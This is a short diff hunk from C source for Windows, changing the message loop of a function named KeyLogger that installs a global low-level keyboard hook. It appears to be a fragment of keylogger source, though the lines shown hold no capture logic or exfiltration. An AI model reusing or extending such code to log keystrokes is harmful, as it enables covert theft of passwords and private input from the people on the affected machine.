@@ -218,11 +218,7 @@ DWORD WINAPI KeyLogger()
 	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInputKeyboard, hExe, 0);
 	MSG msg;
 
-	while (GetMessage(&msg, NULL, 0, 0) != 0)
-	{
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
+	while (GetMessage(&msg, NULL, 0, 0) != 0);
 
 	return 0;
 }
